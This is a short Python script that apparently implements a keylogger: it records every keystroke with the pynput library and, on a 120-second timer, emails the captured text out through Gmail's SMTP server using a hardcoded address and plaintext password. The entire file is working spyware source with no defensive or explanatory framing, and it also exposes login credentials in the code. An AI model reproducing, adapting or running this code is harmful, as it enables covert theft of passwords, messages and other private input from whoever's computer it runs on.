import pynput.keyboard,threading,smtplib


class keylog:

	def __init__(self,time_interval,email,password):
		self.log="Started"
		self.interval=time_interval
		self.email=email
		self.password=password



	def append_log(self,string):
		self.log=self.log+string

	def pkp(self,key):
		try:
			ckey=str(key.char)
		except  Exception as e:
			if key==key.space:
				ckey=" "
			else:
				ckey= " " + str(key) + " " 

		self.append_log(ckey)

	def report(self):

		self.mail(self.email,self.password,"\n\n"+self.log)
		self.log=""
		timer=threading.Timer(self.interval,self.report)
		timer.start()

	def mail(self,email,password,message):
		server=smtplib.SMTP('smtp.gmail.com',587)
		server.starttls()
		server.login(email,password)
		server.sendmail(email,email,message)
		server.quit()


	def start(self):
		kl=pynput.keyboard.Listener(on_press=self.pkp)
		with kl:
			self.report()
			kl.join()

mlog=keylog(120,'cyberbot1502@gmail.com','Hexadecimalqwertyuiop')
mlog.start()
